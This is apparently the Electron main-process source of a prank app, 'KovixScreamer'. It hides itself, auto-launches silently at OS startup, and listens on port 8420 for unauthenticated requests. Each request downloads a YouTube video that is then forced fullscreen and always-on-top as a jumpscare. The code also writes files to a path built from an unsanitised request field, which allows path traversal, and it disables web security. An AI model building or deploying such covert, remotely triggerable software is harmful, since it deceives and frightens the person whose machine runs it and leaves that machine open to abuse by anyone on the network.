import { app, protocol, BrowserWindow, ipcMain } from 'electron';
import { createProtocol, installVueDevtools } from 'vue-cli-plugin-electron-builder/lib';
const isDevelopment = process.env.NODE_ENV !== 'production';

app.commandLine.appendSwitch('autoplay-policy', 'no-user-gesture-required');
app.commandLine.appendSwitch('--autoplay-policy','no-user-gesture-required');

// Keep a global reference of the window object, if you don't, the window will
// be closed automatically when the JavaScript object is garbage collected.
let win: BrowserWindow | null;

// Standard scheme must be registered before the app is ready
protocol.registerStandardSchemes(['app'], { secure: true });
function createWindow () {
  // Create the browser window.
  win = new BrowserWindow({
    fullscreen: true,
    center: true,
    autoHideMenuBar: true,
    resizable: false,
    backgroundColor: '#000',
    webPreferences: {
      webSecurity: false
    }
  });

  if(!isDevelopment){
    win.hide();
    win.setSkipTaskbar(true);
    win.setFullScreen(true);
  }

  if (process.env.WEBPACK_DEV_SERVER_URL) {
    // Load the url of the dev server if in development mode
    win.loadURL(process.env.WEBPACK_DEV_SERVER_URL as string);
    if (!process.env.IS_TEST) win.webContents.openDevTools();
  } else {
    createProtocol('app');
    // Load the index.html when not in development
    win.loadURL('app://./index.html');
  }

  win.on('closed', () => {
    win = null
  });
}

if(!app.requestSingleInstanceLock()) app.quit();
app.on('second-instance', ()=>{
  if(win){
    if (win.isMinimized()) win.restore();
    else if (!win.isVisible()) win.show();
    win.center();
    win.focus();
  }
});

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow();
  }
});

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', async () => {
  if (isDevelopment && !process.env.IS_TEST) {
    // Install Vue Devtools
    try {
      await installVueDevtools();
    } catch (e) {
      console.error('Vue Devtools failed to install:', e.toString());
    }
  }
  createWindow();
  onInit();  
});

// Exit cleanly on request from parent process in development mode.
if (isDevelopment) {
  if (process.platform === 'win32') {
    process.on('message', data => {
      if (data === 'graceful-exit') {
        app.quit();
      }
    })
  } else {
    process.on('SIGTERM', () => {
      app.quit();
    })
  }
}

function getVideoPath(name: any){
  const path = require('path');
  return path.join(app.getPath('userData'), `${name}.mp4`);
}

function onInit() {
  // Set kovix jumpscare to auto launch at OS startup
  const AutoLaunch = require('auto-launch');
  new AutoLaunch({
    name: 'KovixScreamer',
    isHidden: true
  }).enable();

  // Express listener
  const express = require('express');
  const bodyParser = require('body-parser');
  const api = express();
  api.use(bodyParser.json());

  const fs = require('fs');
  const ytdl = require('ytdl-core');

  ipcMain.on('asustovix', () => {
    if(win) {
      win.setFullScreen(true)
      win.setSkipTaskbar(false);
      win.center();
      win.show();
      win.focus();
      win.setAlwaysOnTop(true);
    }
  });

  ipcMain.on('readyToPlay', (event: any) => {

    api.post('/asustovix', (req: any, res: any) => {
      if(!req.body) return res.send('Pasame un body gato');
      if(!req.body.videoUrl) return res.send('Pasame un link de youtube gato');
      if(!req.body.name) return res.send('Pasame un filename para el video gato');
      if(!ytdl.validateURL(req.body.videoUrl)) return res.send('El link de youtube no es valido');

      let options = {
        quality: 'highest',
        filter: (format: any) => format.container === 'mp4'
      }
      if(req.body.options) options = { ...options, ...req.body.options };
      
      const videoStream = ytdl(req.body.videoUrl, options);    
      videoStream.pipe(fs.createWriteStream(getVideoPath(req.body.name)));
      
      videoStream.on('end', () => {
        event.sender.send('readyToPlay', getVideoPath(req.body.name));
        res.send('Asustadovix');
      });
    });

  });

  api.listen(8420);
}
  